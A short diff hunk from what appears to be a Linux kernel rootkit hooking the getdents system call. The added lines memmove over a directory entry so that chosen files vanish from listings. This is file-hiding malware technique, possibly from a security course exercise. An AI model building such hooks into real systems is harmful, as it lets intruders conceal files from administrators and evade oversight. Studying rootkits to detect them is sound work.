@@ -121,6 +121,9 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
       // memmove to delete entry
       void *src = (void *)d + d->d_reclen;
       void *dest = (void *)d;
+      size_t count = (size_t)nread - (bpos + d->d_reclen);
+      memmove(dest, src, count);
+      nread -= d->d_reclen;
     }
 
     bpos += d->d_reclen;
